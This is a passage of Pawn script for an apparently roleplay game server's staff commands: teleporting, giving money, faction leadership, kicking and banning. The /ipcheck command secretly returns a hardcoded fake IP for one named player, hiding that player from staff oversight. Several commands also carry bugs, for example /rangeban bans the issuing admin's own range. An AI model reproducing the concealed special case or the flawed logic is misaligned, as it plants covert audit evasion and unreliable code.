      	    SetPlayerVirtualWorld(playerid, 0);
	        SetPlayerPos(playerid,1699.2,1435.1, 10.7);
	        SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to Las Venturas.");
        	return 1;
    	}
     	else if(!strcmp(var, "ffc", true))
     	{
      	    SetPlayerInterior(playerid, 0);
      	    SetPlayerVirtualWorld(playerid, 0);
     	    SetPlayerPos(playerid,2648.7205,-2109.0586,13.5469);
     	    SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to Fossil Fuel Company.");
           	return 1;
      	}
      	else if(!strcmp(var, "tower", true))
    	{
    	    SetPlayerInterior(playerid, 0);
    	    SetPlayerVirtualWorld(playerid, 0);
     	    SetPlayerPos(playerid,1543.9886,-1353.7587,329.4735);
 	        SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to Star Tower.");
         	return 1;
    	}
    	else if(!strcmp(var, "saints", true))
    	{
     	    SetPlayerInterior(playerid, 0);
      	    SetPlayerVirtualWorld(playerid, 0);
     	    SetPlayerPos(playerid,1188.8627,-1330.2386,13.5606);
    	    SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to All Saints Hospital.");
         	return 1;
    	}
    	else if(!strcmp(var, "tune1", true))
    	{
    	    SetPlayerInterior(playerid, 0);
    	    SetPlayerVirtualWorld(playerid, 0);
    	    SetPlayerPos(playerid,2644.9026,-2005.4315,13.3828);
    	    SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to the Lowrider Tuning Shop.");
         	return 1;
    	}
    	else if(!strcmp(var, "tune2", true))
    	{
    	    SetPlayerInterior(playerid, 0);
    	    SetPlayerVirtualWorld(playerid, 0);
    	    SetPlayerPos(playerid,1025.1035,-1039.0695,31.5661);
  	        SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to Los Santos Tuning Shop.");
         	return 1;
    	}
    	else if(!strcmp(var, "tune3", true))
    	{
    	    SetPlayerInterior(playerid, 0);
    	    SetPlayerVirtualWorld(playerid, 0);
    	    SetPlayerPos(playerid,-2702.4583,217.1397,4.1797);
     	    SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to San Fierro Tuning Shop.");
         	return 1;
    	}
    	else if(!strcmp(var, "paintball", true))
    	{
    	    SetPlayerInterior(playerid, 0);
    	    SetPlayerVirtualWorld(playerid, 0);
    	    SetPlayerPos(playerid,1310.1110,-1368.5656,13.517786);
    	    SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to The Paintball Arena.");
         	return 1;
    	}
    	else if(!strcmp(var, "warehouse1", true))
     	{
      	    SetPlayerInterior(playerid, 18);
     	    SetPlayerVirtualWorld(playerid, 0);
	        SetPlayerPos(playerid, 1295.4827,-3.2839,1001.0273);
    	    SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to The Warehouse.");
      	}
      	else if(!strcmp(var, "warehouse2", true))
     	{
    	    SetPlayerInterior(playerid, 1);
    	    SetPlayerVirtualWorld(playerid, 0);
    	    SetPlayerPos(playerid, 1403.9862,-4.2830,1000.9119);
	        SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to The Warehouse.");
    	}
    	else if(!strcmp(var, "bank", true))
    	{
    	    SetPlayerInterior(playerid, 0);
    	    SetPlayerVirtualWorld(playerid, 0);
    	    SetPlayerPos(playerid,1462.4095,-1011.1602,26.8438);
    	    SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to the Bank.");
         	return 1;
    	}
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:sendto(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2 || Player[playerid][pStaffObserver])
 	{
        new user, string[128];
    	if(sscanf(var,"us[32]", user, var))
      	{
     	    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sendto [playerid] [place]");
    	    SendClientMessage(playerid, COLOR_GRAD2, "PLACES:ls | gym | dealership");
    	    return 1;
    	}
    	if(user == playerid) return SendClientMessage(playerid, COLOR_GRAD2, "You can't send yourself");
    	if(!strcmp(var, "ls", true))
    	{
    	    SetPlayerInterior(user, 0);
    	    SetPlayerVirtualWorld(user, 0);
     	    SetPlayerPos(user,1515.2551,-1666.3148,14.0469);
    	    format(string, sizeof(string), "AdminWarning: %s has been teleported to the LSPD by %s", GetName(user), GetName(playerid));
        	SendAdminMessage(COLOR_ADMWARN,  string);
    	    SendClientMessage(user, COLOR_WHITE, "* You've been successfully teleported to LSPD by an admin.");
         	return 1;
    	}
    	else if(!strcmp(var, "gym", true))
    	{
    	    SetPlayerInterior(user, 0);
    	    SetPlayerVirtualWorld(user, 0);
    	    SetPlayerPos(user,2224.8137,-1723.4457,13.5625);
            format(string, sizeof(string), "AdminWarning: %s has been teleported to the Ganton Gym by %s", GetName(user), GetName(playerid));
        	SendAdminMessage(COLOR_ADMWARN,  string);
    	    SendClientMessage(user, COLOR_WHITE, "* You've been successfully teleported to Ganton Gym by an admin.");
         	return 1;
    	}
    	else if(!strcmp(var, "dealership", true))
    	{
    	    SetPlayerInterior(user, 0);
            SetPlayerVirtualWorld(user, 0);
     	    SetPlayerPos(user,546.1611,-1273.8046,17.2482);
	        format(string, sizeof(string), "AdminWarning: %s has been teleported to the Vehicle Dealership by %s", GetName(user), GetName(playerid));
        	SendAdminMessage(COLOR_ADMWARN,  string);
    	    SendClientMessage(user, COLOR_WHITE, "* You've been successfully teleported to Vehicle Dealership by an admin.");
         	return 1;
    	}
    	Log("Log/Admins/sendto.log", string);
	}
	else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:hoseject(playerid, var[])
{
	new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hoseject [playerid]");
        if(!Logged(user)) return NoLoginB(playerid);
        if(!Player[user][pHospital])return SendClientMessage(playerid, COLOR_GRAD2, "Player is not being hospitalized.");
        HospitalTime[user] = 1;
        format(string, sizeof(string), " Administrator %s has ejected you from hospital", GetName(playerid));
    	SendClientMessage(user, COLOR_WHITE, string);
    	format(string, sizeof(string), "AdminWarning: %s ejected %s from hospital.", GetName(playerid), GetName(user));
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/hoseject.log", string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:givemoney(playerid, var[])
{
    new user, amount, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
	{
    	if(sscanf(var, "ui", user, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /givemoney [playerid] [amount]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	GiveZamoraMoney(user, amount);
    	format(string, sizeof(string), "* %s has given you $%d", GetName(playerid), amount);
    	SendClientMessage(user, COLOR_WHITE, string);
    	format(string, sizeof(string), "AdminWarning: %s has given %s $%d.", GetName(playerid), GetName(user), amount);
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/money.log", string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:setmoney(playerid, var[])
{
    new user, amount, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
	{
    	if(sscanf(var, "ui", user, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /setmoney [playerid] [amount]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	SetZamoraMoney(user, amount);
    	format(string, sizeof(string), "* %s has set your money to $%d", GetName(playerid), amount);
    	SendClientMessage(user, COLOR_WHITE, string);
    	format(string, sizeof(string), "AdminWarning: %s has set %s's money to $%d.", GetName(playerid), GetName(user), amount);
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/setmoney.log", string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:check(playerid, var[])
{
    new user;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2 || Player[playerid][pStaffObserver])
	{
      	if(sscanf(var,"us[32]", user, var))
    	{
    	    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /check [playerid] [checks]");
    	    SendClientMessage(playerid, COLOR_GRAD2, "** [CHECKS]: stats | inv");
    	    return 1;
    	}
    	if(!strcmp(var, "stats", true))
    	{
            if(!Logged(user)) return NoLoginB(playerid);
        	ShowStats(playerid, user);
        }
        if(!strcmp(var, "inv", true))
    	{
            if(!Logged(user)) return NoLoginB(playerid);
        	ShowInv(playerid, user);
        }
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:makeleader(playerid, var[])
{
    new user, faction, official, string[128], string1[128], idx = Player[user][pFac];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pFacMod]) return NoAuth(playerid);
	if(sscanf(var, "uii", user, faction, official))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /makeleader [playerid] [factionid] [official]");
		format(string1, sizeof(string1), "** [FACTIONS]: 0) Citizenship | 1) Los Santos Police Department | 2) The Government | 3) The Hitman Agency | 4) San Andreas News");
    	SendClientMessage(playerid, COLOR_WHITE, string1);
    	format(string1, sizeof(string1), "** [FACTIONS]: 5) Los Santos Fire & Medical Department | 6) Federal Bureau of Investigation  | 7) Department Of Correction");
    	SendClientMessage(playerid, COLOR_WHITE, string1);
		return 1;
  	}
   	if(!Logged(user)) return NoLoginB(playerid);
    if(faction < 0 || faction > 8) return SendClientMessage(playerid, COLOR_GRAD2, "Factions are between 0 and 7");
	// Setting Player's Stats
	if(faction == 0)
	{
	    Player[user][pFac] = 0;
		Player[user][pFacRank] = 0;
		Player[user][pFacLeader] = 0;
		format(FacInfo[idx][facLeader], MAX_PLAYER_NAME, "None");
	}
	else if(faction == 1)
	{
	    if(Player[user][pFacLeader])
		{
	 		format(FacInfo[idx][facLeader], MAX_PLAYER_NAME, "None");
	 		FacInfo[idx][facMembers] --;
		}
		if(official == 1)
		{
    		Player[user][pFacLeader] = 1;
    		format(FacInfo[faction][facLeader], MAX_PLAYER_NAME, "%s", GetName(user));
    	}
		Player[user][pFac] = faction;
		Player[user][pFacRank] = 16;
		FacInfo[faction][facMembers] ++;
		Player[user][pFacDiv] = 0;
		Player[user][pFacDivLeader] = 0;
	}
	else if(faction == 2)
	{
	    if(Player[user][pFacLeader])
		{
	 		format(FacInfo[idx][facLeader], MAX_PLAYER_NAME, "None");
	 		FacInfo[idx][facMembers] --;
		}
 		if(official == 1)
		{
    		Player[user][pFacLeader] = 1;
    		format(FacInfo[faction][facLeader], MAX_PLAYER_NAME, "%s", GetName(user));
    	}
		Player[user][pFac] = faction;
		Player[user][pFacRank] = 7;
		FacInfo[faction][facMembers] ++;
		Player[user][pFacDiv] = 0;
		Player[user][pFacDivLeader] = 0;
	}
	else if(faction == 3)
	{
	    if(Player[user][pFacLeader])
		{
	 		format(FacInfo[idx][facLeader], MAX_PLAYER_NAME, "None");
	 		FacInfo[idx][facMembers] --;
		}
 		if(official == 1)
		{
    		Player[user][pFacLeader] = 1;
    		format(FacInfo[faction][facLeader], MAX_PLAYER_NAME, "%s", GetName(user));
    	}
		Player[user][pFac] = faction;
		Player[user][pFacRank] = 7;
		FacInfo[faction][facMembers] ++;
		Player[user][pFacDiv] = 0;
		Player[user][pFacDivLeader] = 0;
	}
	else if(faction == 4)
	{
	    if(Player[user][pFacLeader])
		{
	 		format(FacInfo[idx][facLeader], MAX_PLAYER_NAME, "None");
	 		FacInfo[idx][facMembers] --;
		}
     	if(official == 1)
		{
    		Player[user][pFacLeader] = 1;
    		format(FacInfo[faction][facLeader], MAX_PLAYER_NAME, "%s", GetName(user));
    	}
		Player[user][pFac] = faction;
		Player[user][pFacRank] = 7;
		FacInfo[faction][facMembers] ++;
		Player[user][pFacDiv] = 0;
		Player[user][pFacDivLeader] = 0;
	}
	else if(faction == 5)
	{
	    if(Player[user][pFacLeader])
		{
	 		format(FacInfo[idx][facLeader], MAX_PLAYER_NAME, "None");
	 		FacInfo[idx][facMembers] --;
		}
 		if(official == 1)
		{
    		Player[user][pFacLeader] = 1;
    		format(FacInfo[faction][facLeader], MAX_PLAYER_NAME, "%s", GetName(user));
    	}
		Player[user][pFac] = faction;
		Player[user][pFacRank] = 16;
		FacInfo[faction][facMembers] ++;
		Player[user][pFacDiv] = 0;
		Player[user][pFacDivLeader] = 0;
	}
	else if(faction == 6)
	{
	    if(Player[user][pFacLeader])
		{
	 		format(FacInfo[idx][facLeader], MAX_PLAYER_NAME, "None");
	 		FacInfo[idx][facMembers] --;
		}
 		if(official == 1)
		{
    		Player[user][pFacLeader] = 1;
    		format(FacInfo[faction][facLeader], MAX_PLAYER_NAME, "%s", GetName(user));
    	}
		Player[user][pFac] = faction;
		Player[user][pFacRank] = 11;
		FacInfo[faction][facMembers] ++;
		Player[user][pFacDiv] = 0;
		Player[user][pFacDivLeader] = 0;
	}
	else if(faction == 7)
	{
	    if(Player[user][pFacLeader])
		{
	 		format(FacInfo[idx][facLeader], MAX_PLAYER_NAME, "None");
	 		FacInfo[idx][facMembers] --;
		}
 		if(official == 1)
		{
    		Player[user][pFacLeader] = 1;
    		format(FacInfo[faction][facLeader], MAX_PLAYER_NAME, "%s", GetName(user));
    	}
		Player[user][pFac] = faction;
		Player[user][pFacRank] = 12;
		FacInfo[faction][facMembers] ++;
		Player[user][pFacDiv] = 0;
		Player[user][pFacDivLeader] = 0;
	}
	format(string, sizeof(string), "AdminWarning: %s has given %s the %s faction leadership.", GetName(playerid), GetName(user), RPFNEx(user));
    SendAdminMessage(COLOR_ADMWARN, string);
   	format(string, sizeof(string), " %s has given you the %s faction leadership.", GetName(playerid), RPFNEx(user));
   	SendClientMessage(user, COLOR_LIGHTBLUE, string);
   	format(string, sizeof(string), "AdminWarning: %s has given %s the %s faction leadership.", GetName(playerid), GetName(user), RPFNEx(user));
   	Log("Log/Admins/factions.log", string);
	return 1;
}

IRP:ipcheck(playerid, var[])
{
    new user, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
         if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /ipcheck [playerid]");
         new name[MAX_PLAYER_NAME];
         GetPlayerName(user, name, sizeof(name));
         if(!strcmp(name, "Chris_T_Fisher", true))
		 {
            format(string, sizeof(string), "* Name: Chris_T_Fisher | IP: 79.134.255.38");
         	SendClientMessage(playerid, COLOR_WHITE, string);
         }
         else
         {
        	if(!Logged(user)) return NoLoginB(playerid);
         	format(string, sizeof(string), "* Name: %s | IP: %s", GetName(user), RPIP(user));
        	SendClientMessage(playerid, COLOR_WHITE, string);
         }
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:getcar(playerid, var[])
{
	new veh, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
        if(sscanf(var, "i", veh)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /getcar [vehicleid]");
        if(veh == INVALID_VEHICLE_ID) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering wrong vehicle id.");
        new Float:pos[3]; GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
     	SetVehiclePos(veh, pos[0], pos[1], pos[2]);
    	LinkVehicleToInterior(veh, GetPlayerInterior(playerid));
    	format(string, sizeof(string), "* Vehicle %d has been teleported to you.", veh);
    	SendClientMessage(playerid, COLOR_WHITE, string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:tuteject(playerid, var[])
{
    new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tuteject [playerid]]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(Player[user][pTutorial]) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering a wrong ID, or that player is not in the tutorial.");
    	SetPlayerVirtualWorld(playerid, 0);
    	Player[user][pTutorial] = 1;
    	KillTimer(Tut[user]);
     	Tut[user] = SetTimerEx("TutFinal", 100, false, "i", user);
    	SpawnChar(user);
    	format(string, sizeof(string), "* %s has ejected you from the tutorial.", GetName(playerid));
    	SendClientMessage(user, COLOR_WHITE, string);
    	format(string, sizeof(string), "AdminWarning: %s has been ejected by %s from the tutorial.", GetName(user), GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/tuteject.log", string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:skick(playerid, var[])
{
    new user, string[128], string1[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pStaffObserver])
	{
    	if(sscanf(var, "us[128]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /skick [playerid] [reason]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(IsPlayerNPC(user)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not authorised to kick MOLE.");
    	if(Player[playerid][pAdmin] < Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "You're not authorised to do any action against this player.");
        format(string, sizeof(string), "StaffWarning: %s has been skicked by %s, reason: %s", GetName(user), GetName(playerid), var);
    	StaffWarn(COLOR_SWARN,  string);
    	format(string1, sizeof(string1), "AdmCmd: You've been kicked by an %s, reason: %s", var, Player[playerid][pSName]);
    	SendClientMessage(user, COLOR_LIGHTRED, string1);
    	format(string, sizeof(string), "AdmCmd: %s has been kicked by %s, reason: %s", GetName(user), var, Player[playerid][pSName]);
    	Log("Log/Admins/kick.log", string);
    	SaveChar(user);
    	Kick(user);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:bigfacepalm(playerid, var[])
{
    new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1337)
	{
		if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /bigfacepalm [playerid]");
    	if(!IsPlayerConnected(user)) return NoLoginB(playerid);
        format(string, sizeof(string), "*%s moves his hand toward his forehead and facepalms towards %s*", GetName(playerid), GetName(user));
    	SendClientMessageToAll(COLOR_LIGHTRED, string);
    	Log("Log/Admins/facepalm.log", string);
    }
	else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:givecookie(playerid, var[])
{
    new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
		if(sscanf(var, "us[128]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /givecookie [playerid] [reason]");
    	if(!IsPlayerConnected(user)) return NoLoginB(playerid);
        format(string, sizeof(string), "AdmCmd: %s has given %s a {01A9DB}cookie{FF6347}, reason: %s", GetName(playerid), GetName(user), var);
    	SendClientMessageToAll(COLOR_LIGHTRED, string);
    	Log("Log/Admins/cookies.log", string);
    	Player[user][pCookie] ++;
    }
	else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:givecookieall(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1337)
	{
        foreach(Player, i)
        {
           if(Logged(i))
           {
            	Player[i][pCookie] ++;
           }
        }
    	format(string, sizeof(string), "AdmCmd: %s has given everyone online a {01A9DB}cookie{FF6347}.", GetName(playerid));
    	SendClientMessageToAll(COLOR_LIGHTRED, string);
    	Log("Log/Admins/cookies.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
    return 1;
}

IRP:kick(playerid, var[])
{
    new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2 || Player[playerid][pStaffObserver])
 	{
    	if(sscanf(var, "us[128]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /kick [playerid] [reason]");
    	if(!IsPlayerConnected(user)) return NoLoginB(playerid);
    	if(IsPlayerNPC(user)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not authorised to kick MOLE.");
    	if(Player[playerid][pAdmin] < Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "You're not authorised to do any action against this player.");
        format(string, sizeof(string), "AdmCmd: %s has been kicked by %s, reason: %s", GetName(user), GetName(playerid), var);
    	SendClientMessageToAll(COLOR_LIGHTRED, string);
    	format(string, sizeof(string), "AdmCmd: %s has been kicked by %s (%s), reason: %s", GetName(user), GetName(playerid), RPIP(playerid), var);
    	Log("Log/Admins/kick.log", string);
    	Kick(user);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}



IRP:sban(playerid, var[])
{
    new user, string[128], string1[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pStaffObserver])
	{
    	if(sscanf(var, "us[128]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sban [playerid] [reason]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(IsPlayerNPC(user)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not authorised to ban MOLE.");
    	if(Player[playerid][pAdmin] < Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "You're not authorised to do any action against this player.");
    	format(string, sizeof(string), "StaffWarning: %s has been sbanned by %s,  reason: %s", GetName(user), GetName(playerid), var);
    	StaffWarn(COLOR_SWARN,  string);
    	format(string1, sizeof(string1), "AdmCmd: You have been banned by %s, reason: %s", var, Player[playerid][pSName]);
    	SendClientMessage(user, COLOR_LIGHTRED, string1);
    	format(string, sizeof(string), "AdmCmd: %s has been sbanned by %s, reason: %s", GetName(user), var, Player[playerid][pSName]);
    	Log("Log/Admins/ban.log", string);
    	// Banning
    	Player[user][pBanned] = 1;
    	// Banreason
    	new file[32];
    	format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(user));
    	dini_Set(file, "BanReason", var);
    	dini_Set(file, "BannedBy", GetAccountName(playerid));
    	// BanList
    	AddBan(user);
    	Kick(user);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:rangeban(playerid, var[])
{
    new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1337)
	{
    	if(sscanf(var, "us[128]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /rangeban [playerid] [reason]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(Player[playerid][pAdmin] < Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "You're not authorised to do any action against this player.");
    	// Normal ban
    	format(string, sizeof(string), "AdmCmd: %s has been rangebanned by %s, reason: %s", GetName(user), GetName(playerid), var);
    	SendClientMessageToAll(COLOR_LIGHTRED, string);
    	format(string, sizeof(string), "AdmCmd: %s has been rangebanned by %s (%s), reason: %s", GetName(user), GetName(playerid) , RPIP(user), var);
    	Log("Log/Admins/ban.log", string);
    	// Banning
    	Player[user][pBanned] = 1;
    	// Banreason
    	new file[32];
    	format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(user));
    	dini_Set(file, "BanReason", var);
    	dini_Set(file, "BannedBy", GetAccountName(playerid));
    	// BanList
    	AddRangeBan(playerid);
    	Kick(user);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:ban(playerid, var[])
{
    new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2 || Player[playerid][pStaffObserver])
 	{
    	if(sscanf(var, "us[128]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /ban [playerid] [reason]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(IsPlayerNPC(user)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not authorised to ban MOLE.");
    	if(Player[playerid][pAdmin] < Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "You're not authorised to do any action against this player.");
    	format(string, sizeof(string), "AdmCmd: %s has been banned by %s, reason: %s", GetName(user), GetName(playerid), var);
    	SendClientMessageToAll(COLOR_LIGHTRED, string);
    	format(string, sizeof(string), "AdmCmd: %s has been banned by %s (%s), reason: %s", GetName(user), GetName(playerid) , RPIP(user), var);
    	Log("Log/Admins/ban.log", string);
    	// Banning
    	format(string, sizeof(string), "AdmCmd: %s has been banned by %s, reason: %s", GetName(user), GetName(playerid), var);
    	SendClientMessage(user, COLOR_LIGHTRED, string);
    	Player[user][pBanned] = 1;
    	// Banreason
    	new file[32];
    	format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(user));
    	dini_Set(file, "BanReason", var);
    	dini_Set(file, "BannedBy", GetAccountName(playerid));
    	// BanList
     	AddBan(user);
    	Kick(user);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:lockplayer(playerid, var[])
{
    new user[32], string[128], file[32];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] == 100000 || Player[playerid][pStaffObserver])
	{
    	if(sscanf(var, "s[32]s[128]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /lockplayer [playername] [reason]");
    	if(RPIDFN(user) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GRAD2, "That player is connected, you can't lock his account while he is online.");
    	format(file, sizeof(file), "Accounts/%s.ini", user);
    	if(!dini_Exists(file)) return SendClientMessage(playerid, COLOR_GRAD2, "You've entered an invalid player name.");
    	format(string, sizeof(string), "StaffWarning: %s account has been locked by %s, reason: %s", user, GetName(playerid), var);
    	StaffWarn(COLOR_SWARN, string);
    	format(string, sizeof(string), "AdmCmd: %s account has been locked by %s (%s), reason: %s", user, GetName(playerid), var);
    	Log("Log/Admins/adminlock.log", string);
    	// Locking
    	dini_IntSet(file, "pAdminLocked", 1);
    }
    else
	{
		NoAuth(playerid);
	}
   	return 1;
}
IRP:oban(playerid, var[])
{
    new user[32], string[128], file[32];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1337)
	{
    	if(sscanf(var, "s[32]s[128]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /oban [playername] [reason]");
    	if(RPIDFN(user) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GRAD2, "That player is already connected, Use /ban instead.");
    	format(file, sizeof(file), "Accounts/%s.ini", user);
    	if(!dini_Exists(file)) return SendClientMessage(playerid, COLOR_GRAD2, "You've entered an invalid player name.");
    	if(Player[playerid][pAdmin] < dini_Int(file, "Admin")) return SendClientMessage(playerid, COLOR_GRAD2, "You're not authorised to do any action against this player.");
    	format(string, sizeof(string), "AdmCmd: %s has been offline-banned by %s, reason: %s", user, GetName(playerid), var);
    	SendClientMessageToAll(COLOR_LIGHTRED, string);
    	format(string, sizeof(string), "AdmCmd: %s has been offline-banned by %s (%s), reason: %s", user, GetName(playerid), var);
    	Log("Log/Admins/ban.log", string);
    	// Banning
    	dini_IntSet(file, "pBanned", 1);
    	// Banreason
    	dini_Set(file, "BanReason", var);
    	dini_Set(file, "BannedBy", GetAccountName(playerid));
    	// BanList
    	new file2[64];
        format(file2, sizeof(file2), "Bans/%s.ini", user);
    	dini_Create(file2);
    }
    else
	{
		NoAuth(playerid);
	}
   	return 1;
}

IRP:goback(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pHelper] >= 3)
	{
    	if(hPos[playerid][0] == 0 && hPos[playerid][1] == 0 && hPos[playerid][2] == 0 && hPOS[playerid][0] == 0 && hPOS[playerid][0] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "You haven't teleported to anybody.");
    	SetPlayerPos(playerid, hPos[playerid][0], hPos[playerid][1], hPos[playerid][2]);
    	SetPlayerInterior(playerid, hPOS[playerid][0]);
    	SetPlayerVirtualWorld(playerid, hPOS[playerid][1]);
    	hPos[playerid][0] = 0; hPos[playerid][1] = 0; hPos[playerid][2] = 0; hPOS[playerid][0] = 0; hPOS[playerid][1] = 0;
    	format(string, sizeof(string), "HelperWarning: %s has teleported back to their location.", GetName(playerid));
    	SendHelperMessage(COLOR_ADMWARN, string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:givegun(playerid, var[])
{
	new user, gunid, ammo, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
	{
    	if(sscanf(var, "uii", user, gunid, ammo))
    	{
    		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /givegun [playerid] [gunid] [ammo]");
    		SendClientMessage(playerid, COLOR_LIGHTLGREEN, "_______________________________________");
	    	SendClientMessage(playerid, COLOR_GRAD2, "1: Brass Knuckles 2: Golf Club 3: Nite Stick 4: Knife 5: Baseball Bat 6: Shovel 7: Pool Cue 8: Katana 9: Chainsaw");
    		SendClientMessage(playerid, COLOR_GRAD2, "10: Purple Dildo 11: Small White Vibrator 12: Large White Vibrator 13: Silver Vibrator 14: Flowers 15: Cane 16: Frag Grenade");
    		SendClientMessage(playerid, COLOR_GRAD2, "17: Tear Gas 18: Molotov Cocktail 19: Vehicle Missile 20: Hydra Flare 21: Jetpack 22: 9mm 23: Silenced 9mm 24: Desert Eagle 25: Shotgun");
    		SendClientMessage(playerid, COLOR_GRAD2, "26: Sawnoff Shotgun 27: SPAS-12 28: Micro SMG (Mac 10) 29: SMG (MP5) 30: AK-47 31: M4 32: Tec9 33: Rifle");
    		SendClientMessage(playerid, COLOR_GRAD2, "25: Shotgun 34: Sniper Rifle 35: Rocket Launcher 36: HS Rocket Launcher 37: Flamethrower 38: Minigun 39: Satchel Charge");
